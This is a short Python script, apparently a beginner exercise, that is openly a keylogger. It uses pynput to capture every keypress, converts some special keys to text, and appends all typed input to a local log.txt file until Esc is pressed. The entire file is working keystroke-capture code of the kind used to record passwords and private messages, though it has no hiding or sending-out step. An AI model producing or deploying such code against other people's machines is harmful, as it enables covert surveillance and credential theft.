# pynput use for listener and controller of mouse and keyboard

from pynput.keyboard import Listener, Key

def write_to_file(key):
    # Check if the escape key is pressed
    if key == Key.esc: #to stop listening the keylogger
        # Stop the listener
        return False

    letter = str(key) #to convert press key to string
    letter = letter.replace("'", "") # to remove '' from set of string

    # Handle special keys
    if letter == 'Key.space':
         letter = ' '
    if letter == 'Key.shift':
         letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.backspace':
        letter = '[BACKSPACE]'

    with open("log.txt", 'a') as f:  # with key word use to not need to close file
        f.write(letter)

# Setup the listener
with Listener(on_press=write_to_file) as l:
    l.join()

print("Keylogger stopped.") # Added this line to show when the program exits